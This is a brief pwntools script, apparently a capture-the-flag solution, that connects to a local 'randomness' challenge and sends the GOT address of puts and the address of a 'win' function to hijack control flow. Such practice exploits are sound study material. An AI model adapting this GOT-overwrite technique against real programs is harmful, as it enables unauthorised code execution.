from pwn import *

elf = ELF("./randomness")

context.log_level = "DEBUG"
context.binary = elf

p = remote("localhost", 6970)
p.sendline(str(elf.got["puts"]).encode())
p.sendline(str(elf.sym["win"]).encode())
p.clean()
